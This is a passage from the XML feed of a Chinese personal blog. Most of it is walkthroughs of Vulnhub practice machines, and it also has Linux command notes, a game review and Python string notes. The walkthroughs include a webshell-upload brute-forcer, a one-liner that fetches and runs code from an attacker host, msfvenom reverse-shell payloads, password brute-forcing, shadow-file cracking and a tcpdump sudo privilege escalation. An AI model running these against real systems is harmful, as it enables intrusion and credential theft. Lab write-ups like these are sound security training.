href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src="/posts/e4ff8385/1575977956725.png" alt></p><pre><code>You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</code></pre><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><pre><code>msf5 auxiliary(scanner/nfs/nfsmount) &gt; exploit [+] 192.168.99.104:111    - 192.168.99.104 NFS Export: /home/morris [*][*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><pre><code>I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..blehguessme090</code></pre><p>于是成功登陆morris用户<br><img src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba</a><br><a href="https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-HackInOs</title>
      <link href="/posts/fcea4f6a/"/>
      <url>/posts/fcea4f6a/</url>
      
        <content type="html"><![CDATA[<h1 id="HackInOs-有内网"><a href="#HackInOs-有内网" class="headerlink" title="HackInOs(有内网)"></a>HackInOs(有内网)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP 192.168.99.100<br>kali IP 192.168.99.101</p><p>nmap扫描结果</p><p><img src="/posts/fcea4f6a/1576559471820.png" alt></p><p>存在上传点但是无法上传文件</p><p><img src="/posts/fcea4f6a/1576559561592.png" alt></p><p>Burp抓包发现页面源代码有注释<br><a href="https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php" target="_blank" rel="noopener">https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</a></p><p>看到提示</p><p>看到其只使用了<code>getimagesize</code>函数进行检验<br>通过加添GIF89a可以绕过上传</p><p>而文件的名字是这么产生的<br><img src="/posts/fcea4f6a/1576560249639.png" alt></p><p>于是上传一个一句话木马，然后对目录进行爆破即可</p><pre><code># coding:utf-8import hashlibimport requestsbase_url = &quot;http://192.168.99.100:8000/uploads/&quot;target = []for i in range(101):    shell = &#39;shell.php&#39; + str(i)     shell_md5 = hashlib.md5(shell.encode(&#39;utf-8&#39;)).hexdigest()    target.append(base_url + shell_md5 + &#39;.php&#39;)for t in target:    r = requests.get(t)    if r.status_code == 200:        print(&quot;find it!&quot;)        print(t)        break</code></pre><p>之后使用蚁剑成功连接<br><img src="/posts/fcea4f6a/1576560324056.png" alt></p><p>但是发现上传不久之后shell就被删掉了</p><p>所以需要将shell移动到html目录下，(考验手速的时候到了)</p><p><img src="/posts/fcea4f6a/1576560733771.png" alt><br>此时成功得到shell，开始提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><img src="/posts/fcea4f6a/1576561228491.png" alt></p><p>使用tail命令查看<code>/etc/shadow</code></p><p>将root用户复制过来，使用john进行爆破</p><p><img src="/posts/fcea4f6a/1576561315061.png" alt></p><p>得到root账号的密码是john</p><p><img src="/posts/fcea4f6a/1576561335215.png" alt></p><p>之后切换到root用户查看flag，但是并没有结束</p><p>运行提权辅助脚本</p><p><img src="/posts/fcea4f6a/1576561435933.png" alt></p><p>注意到提权辅助脚本提示有docker<br><img src="/posts/fcea4f6a/1576561476445.png" alt></p><p>查看IP<br><img src="/posts/fcea4f6a/1576561501817.png" alt></p><p>看这个IP地址很像是docker中的地址</p><p>尝试直接用root账户及其密码john进行连接，失败</p><p>大概猜到了我只是拿到了一台docker容器的权限，并没有进入到主机</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>反弹的shell功能还是弱了，想办法得到一个<code>meterpreter</code></p><p>这里有记录一下通过shell拿到<code>meterpreter</code>的几种办法</p><h3 id="web-delivery脚本"><a href="#web-delivery脚本" class="headerlink" title="web_delivery脚本"></a>web_delivery脚本</h3><p>使用<code>exploit/multi/script/web_delivery</code> </p><p>设置好相关参数</p><p><img src="/posts/fcea4f6a/1576562272920.png" alt></p><p>在反弹的shell中运行这段payload</p><pre><code>python -c &quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.99.101:8080/1PrsFQbkzsmuk5&#39;);exec(r.read());&quot;</code></pre><p>得到<code>meterpreter</code>之后输入<code>background</code>让其挂起</p><h3 id="使用msfenvom生成木马"><a href="#使用msfenvom生成木马" class="headerlink" title="使用msfenvom生成木马"></a>使用msfenvom生成木马</h3><p>使用<code>exploit/multi/handler</code> 这个exploit模块</p><p>加载<code>linux/x86/meterpreter_reverse_tcp</code> 这个payload，同时通过<code>msfvenom</code> 去生成一个木马</p><p><img src="/posts/fcea4f6a/1577094332538.png" alt><br><code>msfvenom</code>生成木马</p><p><code>msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.99.102 lport=4444 -f elf -o shell</code></p><p><img src="/posts/fcea4f6a/1577094345676.png" alt></p><p>蚁剑上传<br><img src="/posts/fcea4f6a/1577094459850.png" alt><br>执行</p><p><img src="/posts/fcea4f6a/1577094504865.png" alt></p><p>反弹得到<code>meterpreter</code></p><p><img src="/posts/fcea4f6a/1577094525517.png" alt></p><p>得到子网信息<br><img src="/posts/fcea4f6a/1577094592386.png" alt></p><p>之后通过metasploit之后添加一条路由<br><img src="/posts/fcea4f6a/1576562463870.png" alt></p><p>此时就可以看到添加的路由信息了</p><p><img src="/posts/fcea4f6a/1576581218733.png" alt></p><p>路由添加也可以通过：<code>rout add 172.18.0.0 255.255.0.0 1</code></p><p>指定了网段和子网掩码，以及对应的session<br><img src="/posts/fcea4f6a/1577094657843.png" alt></p><p>这之后我们就可以在<code>metasploit</code>中访问内网的地址了，先进行主机发现</p><p><img src="/posts/fcea4f6a/1576562503028.png" alt></p><p>发现了四台主机</p><p>进行后续的端口扫描<br><img src="/posts/fcea4f6a/1576562587710.png" alt><br>(由于扫描速度比较慢，参数调整了一下)</p><p><img src="/posts/fcea4f6a/1576581339308.png" alt></p><p>这里也尝试通过<code>proxychain</code>去进行扫描</p><h3 id="proxychain的配置"><a href="#proxychain的配置" class="headerlink" title="proxychain的配置"></a>proxychain的配置</h3><p><img src="/posts/fcea4f6a/1577095583741.png" alt></p><p>使用socks4a代理，修改<code>/etc/proxychains.conf</code>文件，</p><p><img src="/posts/fcea4f6a/1577095622289.png" alt><br> 取消注释同时在最后一行加上<code>127.0.0.1 1080</code><br>由于<code>proxyresolv</code>的位置有点问题，cp过来</p><p> <code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>之后可以通过<code>proxychains nmap -A -T4 172.18.0.2</code>启动nmap扫描，但是扫描的结果有问题</p><pre><code>root@kali:~# proxyresolv 172.18.0.3|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK172.18.0.3</code></pre><p>能够正常解析但是还是存在问题</p><p>172.18.0.2 开放了3306端口数据库，进行连接</p><p><img src="/posts/fcea4f6a/1576563049227.png" alt></p><p>此处也可以通过<code>portfwd add -l 8123 -r 172.18.0.3 -p 3306</code>端口转发到本地进行连接</p><p><code>mysql -h 127.0.0.1  -P 8123 -uwordpress -pwordpress</code><br><img src="/posts/fcea4f6a/1577094918289.png" alt></p><p>查看数据<br><img src="/posts/fcea4f6a/1576563178481.png" alt></p><p><img src="/posts/fcea4f6a/1576563190812.png" alt></p><p>解密之后得到123456<br><img src="/posts/fcea4f6a/1576563163280.png" alt></p><p>于是尝试直接使用该用户登陆主机</p><p>该用户在docker组中，可以尝试通过docker提权</p><p><img src="/posts/fcea4f6a/1576581408046.png" alt></p><p>运行的docker镜像<br><img src="/posts/fcea4f6a/1576581491492.png" alt></p><p>docker挂载即可<br><img src="/posts/fcea4f6a/1577096085570.png" alt></p><p>得到flag<br><img src="/posts/fcea4f6a/1576581453268.png" alt></p><p>另外一种方式提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>查找SUID用户运行的程序<br><img src="/posts/fcea4f6a/1576581556847.png" alt></p><p>发现a.out</p><p><img src="/posts/fcea4f6a/1576581569529.png" alt><br>猜测其运行的是whoami命令</p><p>通过环境变量提权<br><img src="/posts/fcea4f6a/1576581656579.png" alt></p><p>同样拿到flag<br><img src="/posts/fcea4f6a/1576581679658.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-kill</title>
      <link href="/posts/da023d5c/"/>
      <url>/posts/da023d5c/</url>
      
        <content type="html"><![CDATA[<h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>首先需要熟悉一下 ps 命令</p><p>一般通过 <code>ps aux | more</code> 查看到所有的进程</p><p><code>ps -e</code> 列出程序时，显示每个程序所使用的环境变量</p><p><code>ps u</code> 　 以用户为主的格式来显示程序状况。</p><p><code>ps -a</code>显示同一终端下的所有程序</p><p><code>ps a</code> 显示所有进程</p><h2 id="kill-命令"><a href="#kill-命令" class="headerlink" title="kill 命令"></a>kill 命令</h2>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令trick</title>
      <link href="/posts/ebe7281d/"/>
      <url>/posts/ebe7281d/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的命令组合"><a href="#常用的命令组合" class="headerlink" title="常用的命令组合"></a>常用的命令组合</h2><p><strong>统计字符串长度</strong></p><pre><code class="bash">$ echo -n 12345 | wc -c5</code></pre><h2 id="搜索文件后门"><a href="#搜索文件后门" class="headerlink" title="搜索文件后门"></a>搜索文件后门</h2><pre><code class="bash"># 简单的查找后门find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h2 id="数据库备份-mysqldump用法"><a href="#数据库备份-mysqldump用法" class="headerlink" title="数据库备份 mysqldump用法"></a>数据库备份 mysqldump用法</h2><pre><code class="bash">mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库mysqldump --all-databases &gt; bak.sql //备份所有数据库mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库//也可以登录到mysql之后再 source xxx.sql</code></pre><h2 id="mysql-修改密码"><a href="#mysql-修改密码" class="headerlink" title="mysql 修改密码"></a>mysql 修改密码</h2><pre><code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);Query OK, 0 rows affected, 1 warning (0.00 sec)</code></pre><p>但是这条命令似乎不行</p><pre><code>update user set password=PASSWORD(&#39;NEW PASSWORD&#39;) where user=&#39;root&#39;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-WebDeveloper</title>
      <link href="/posts/4d0603d0/"/>
      <url>/posts/4d0603d0/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描端口发现是 80 和 22开放了，其中80运行着wordpress服务</p><p>使用 <code>wpscan</code> 扫描用户和插件</p><pre><code>wpscan --url http://192.168.99.100/ -e u,p </code></pre><p>发现了用户 <code>webdeveloper</code></p><p>之后自然是尝试爆破密码了，使用 <code>wpscan</code> 和 <code>hydra</code> 同时爆破</p><pre><code>wpscan --url http://192.168.99.100/ -U webdeveloper  -P ./rockyou.txthydra -l webdeveloper -P rockyou.txt  -t 10 192.168.99.100 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:login_error&quot;</code></pre><p>但是经过很长时间后并没有爆破出来，神器 <code>xray</code> 扫描也为探测到相关信息</p><p>也尝试使用了 <code>dirsearch.py</code> ，但是依旧无果</p><p>换用了 <code>dirb</code></p><pre><code>GENERATED WORDS: 4613                                                          ---- Scanning URL: http://192.168.99.100/ ----+ http://192.168.99.100/index.php (CODE:301|SIZE:0)                                                                                                         ==&gt; DIRECTORY: http://192.168.99.100/ipdata/   !!!                                                                                                             + http://192.168.99.100/server-status (CODE:403|SIZE:302)                                                                                                   ==&gt; DIRECTORY: http://192.168.99.100/wp-admin/                                                                                                              ==&gt; DIRECTORY: http://192.168.99.100/wp-content/                                                                                                            ==&gt; DIRECTORY: http://192.168.99.100/wp-includes/                                                                                                           + http://192.168.99.100/xmlrpc.php (CODE:405|SIZE:42)       </code></pre><p>发现了 <code>ipdata/</code> 目录，访问之后是一个流量包</p><p>打开之后过滤</p><pre><code>http.request.method == &quot;POST&quot;</code></pre><p><img src="/posts/4d0603d0/1580996926610.png" alt></p><p>原来密码这么复杂。怪不得爆破不出来</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录后台之后发现安装了两个插件，并且可以修改源代码，这时候就会想到用 <code>msfvenom</code> 生成php木马，然后反弹得到shell</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.99.1 lport=4444 -f raw -o shell.php</code></pre><p>修改一个插件的源码然后启用就能拿到shell了</p><p>然后查看 <code>wp-config.php</code></p><pre><code>// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);/** MySQL database username */define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);/** MySQL database password */define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);/** MySQL hostname */define(&#39;DB_HOST&#39;, &#39;localhost&#39;);/** Database Charset to use in creating database tables. */define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);/** The Database Collate type. Don&#39;t change this if in doubt. */define(&#39;DB_COLLATE&#39;, &#39;&#39;);</code></pre><p>获得了数据库的账号和密码，那就登陆一下数据库</p><p>但是在数据库中并没有获得很多信息</p><pre><code>mysql&gt; show tables;show tables;+-----------------------+| Tables_in_wordpress   |+-----------------------+| wp_commentmeta        || wp_comments           || wp_links              || wp_options            || wp_postmeta           || wp_posts              || wp_term_relationships || wp_term_taxonomy      || wp_termmeta           || wp_terms              || wp_usermeta           || wp_users              |+-----------------------+12 rows in set (0.00 sec</code></pre><p>尝试直接ssh登陆，居然可以！</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录之后 ， <code>sudo -l</code></p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>那就可以用 <code>tcpdump</code> 提权了</p><pre><code class="bash">webdeveloper@webdeveloper:~$ touch /tmp/exploitwebdeveloper@webdeveloper:~$ echo &quot;cat /root/flag.txt&quot; &gt; /tmp/exploitwebdeveloper@webdeveloper:~$ chmod +x /tmp/exploitwebdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root[sudo] password for webdeveloper:dropped privs to roottcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytesMaximum file limit reached: 11 packet captured710 packets received by filter0 packets dropped by kernelwebdeveloper@webdeveloper:~$ Congratulations here is youre flag:cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-tcpdump</title>
      <link href="/posts/9cc474ce/"/>
      <url>/posts/9cc474ce/</url>
      
        <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul><li>-i 指定网卡接口</li><li>-c 指定数量</li><li>-w 保存的文件名</li><li>-z 指定脚本</li><li>-Z 指定用户</li></ul><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p><pre><code>tcpdump host 210.27.48.1 </code></pre><p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信</p><pre><code>tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \) </code></pre><p>截获主机hostname发送的所有数据</p><pre><code>tcpdump -i eth0 src host hostname</code></pre><p>监视所有送到主机的数据包</p><pre><code>tcpdump -i eth0 dst host hostname</code></pre><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令</p><pre><code>tcpdump tcp port 23 and host 210.27.48.1</code></pre><p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p><pre><code>tcpdump udp port 123 </code></pre><h2 id="使用tcpdump抓包，再用wireshark查看"><a href="#使用tcpdump抓包，再用wireshark查看" class="headerlink" title="使用tcpdump抓包，再用wireshark查看"></a>使用tcpdump抓包，再用wireshark查看</h2><pre><code>tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></pre><p>抓取http包</p><pre><code>tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854</code></pre><h2 id="tcpdump提权"><a href="#tcpdump提权" class="headerlink" title="tcpdump提权"></a>tcpdump提权</h2><p>遇到这种情况</p><pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l[sudo] password for webdeveloper:Matching Defaults entries for webdeveloper on webdeveloper:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser webdeveloper may run the following commands on webdeveloper:    (root) /usr/sbin/tcpdump</code></pre><p>可以用root身份执行tcpdump命令，其中 <code>/tmp/exploit</code> 是想要以root身份执行的脚本</p><pre><code>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</code></pre><blockquote><p>-z 指定脚本，-Z 指定用户身份</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcpdump </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何保护版权</title>
      <link href="/posts/3b32f749/"/>
      <url>/posts/3b32f749/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰气时代玩后感</title>
      <link href="/posts/69f21310/"/>
      <url>/posts/69f21310/</url>
      
        <content type="html"><![CDATA[<p>寒假正逢steam打折，一直放在愿望单中的冰气时代这会降价了，果断入坑</p><p>买来之后第一把就找不着北了，游戏的玩法还是比较简单，但是前期资源匮乏，我需要收集木炭和木材，我一开始并没有意识到，等我将木材耗尽之后发现没有地方可以收集木材了？？？周围倒是有一些冻树木，但是要建造伐木场才行，wtf???,这游戏难道就到头了？</p><p>之后去找了B站的教程，欸突然意识到原来黑乎乎的一团有些是煤堆，有些是木箱23333，采集木箱可以收集木材。哦这游戏居然可以这样玩啊。这还只是我遇到的第一个坑，后面还遇到了建房子要和道路相连，道路要和能量塔相连等等</p><p> 不过这个游戏设计的比较好的就是法律和不满值了，我一直很担心不满值会升高，但是有些法律又不得不的签署，比如童工，比如加班，如果不这样的话就导致资源收集的速度很慢，大部分时候收集到的煤炭一个晚上就耗完了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python文件</title>
      <link href="/posts/75a61507/"/>
      <url>/posts/75a61507/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python3字符串</title>
      <link href="/posts/25e898cd/"/>
      <url>/posts/25e898cd/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="性质判定"><a href="#性质判定" class="headerlink" title="性质判定"></a>性质判定</h3><pre><code>isalnum()、isalpha()、isdigit()、islower()、isupper()、isspace()、istitle()、startswith(prefix[,start[, end]])、endswith(suffix[,start[, end]])</code></pre><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><pre><code>count( sub[, start[, end]])、find( sub[, start[,end]])、index( sub[, start[, end]])、rfind( sub[, start[,end]])、rindex(sub[, start[, end]])</code></pre><p>注意find()和index()方法的不同：find()函数族找不到时返回-1，index()函数族则抛出ValueError异常。</p><p>但是对于判定是否包含字串的判定推荐用  <code>in</code> 和 <code>not in</code>操作符</p><p><code>replace(old, new[,count])</code>用以替换字符串的某些子串，如果指定count参数的话，就最多替换count次，如果不指定，就全部替换</p><h3 id="分切和连接"><a href="#分切和连接" class="headerlink" title="分切和连接"></a>分切和连接</h3><p><code>partition()</code> 和 <code>split</code> </p><p>split举例</p><pre><code class="python">&gt;&gt;&gt; &#39; hello     world&#39;.split()[&#39;hello&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39; &#39;)  # 要注意第一种方式和第二种方式不一样[&#39;&#39;, &#39;hello&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;world&#39;]&gt;&gt;&gt; &#39; hello     world&#39;.split(&#39;&#39;)Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ValueError: empty separator&gt;&gt;&gt; &#39;&#39;.split()[]&gt;&gt;&gt; &#39;&#39;.split(&#39; &#39;)[&#39;&#39;]</code></pre><h3 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h3><pre><code>lower()、upper()、capitalize()、swapcase()、title()</code></pre><h3 id="删减与填充"><a href="#删减与填充" class="headerlink" title="删减与填充"></a>删减与填充</h3><pre><code>strip([chars])、lstrip([chars])、rstrip([chars])center(width[, fillchar])、ljust(width[,fillchar])、rjust(width[, fillchar])、zfill(width)、expandtabs([tabsize])</code></pre><p>这些方法中的fillchar参数是指用以填充的字符，默认是空格。而zfill()中的z是指zero，所以顾名思义，zfill()即是以字符0进行填充，在输出数值时比较常用。expandtabs()的tabsize参数默认为8，它的功能是把字符串中的制表符（tab）转换为适当数量的空格。</p><h2 id="f字符串"><a href="#f字符串" class="headerlink" title="f字符串"></a>f字符串</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre><code class="python">In [2]: name = &quot;pxy&quot;In [3]: f&#39;Hello, my name is {name}&#39;Out[3]: &#39;Hello, my name is pxy&#39;</code></pre><p>求值运算</p><pre><code class="python">In [5]: &gt;&gt;&gt; f&#39;Complex number {(2 + 2j) / (2 - 3j)}&#39;Out[5]: &#39;Complex number (-0.15384615384615388+0.7692307692307692j)&#39;In [6]: import mathIn [7]: f&#39;The answer is {math.log(math.pi)}&#39;Out[7]: &#39;The answer is 1.1447298858494002</code></pre><p>f-string大括号内也可填入lambda表达式，但lambda表达式的 <code>:</code> 会被f-string误认为是表达式与格式描述符之间的分隔符，为避免歧义，需要将lambda表达式置于括号 <code>()</code> 内：</p><pre><code class="python">In [1]: f&#39;result is {(lambda x: x ** 2 + 1) (2)}&#39;Out[1]: &#39;result is 5&#39;</code></pre><h2 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h2><h3 id="str转bytes"><a href="#str转bytes" class="headerlink" title="str转bytes"></a>str转bytes</h3><pre><code class="python">In [23]: bytes(a, encoding=&quot;gbk&quot;)Out[23]: b&#39;\xb0\xd9\xb6\xc8&#39;In [24]: bytes(a, encoding=&quot;utf-8&quot;)Out[24]: b&#39;\xe7\x99\xbe\xe5\xba\xa6&#39;</code></pre><h3 id="从十六进制转化为bytes"><a href="#从十六进制转化为bytes" class="headerlink" title="从十六进制转化为bytes"></a>从十六进制转化为bytes</h3><pre><code class="python">In [39]: a = &#39;aabbccddeeff&#39;In [40]: a_bytes = bytes.fromhex(a)In [41]: a_bytesOut[41]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;</code></pre><h3 id="从bytes转化为十六进制"><a href="#从bytes转化为十六进制" class="headerlink" title="从bytes转化为十六进制"></a>从bytes转化为十六进制</h3><pre><code class="python">In [42]: a_bytesOut[42]: b&#39;\xaa\xbb\xcc\xdd\xee\xff&#39;In [43]: a_bytes.hex()Out[43]: &#39;aabbccddeeff&#39;</code></pre><h3 id="base64编码byets"><a href="#base64编码byets" class="headerlink" title="base64编码byets"></a>base64编码byets</h3><p>python3的base64包的 <code>b64encode</code> 只能使用 bytes 类型</p><pre><code class="python"># 比如我们要编码 \xac\xedIn [54]: a = &quot;aced&quot;In [55]: a = bytes.fromhex(a)In [56]: aOut[56]: b&#39;\xac\xed&#39;In [57]: base64.b64encode(a)Out[57]: b&#39;rO0=&#39;</code></pre><h3 id="md5加密bytes"><a href="#md5加密bytes" class="headerlink" title="md5加密bytes"></a>md5加密bytes</h3><p>python3 只能用hashlib中的md5函数</p><pre><code class="python">a = hashlib.md5()a.update(b&quot;pxy&quot;)a.hexdigest()</code></pre><p>封装一下</p><pre><code class="python"># 生成MD5def genearteMD5(str):    # 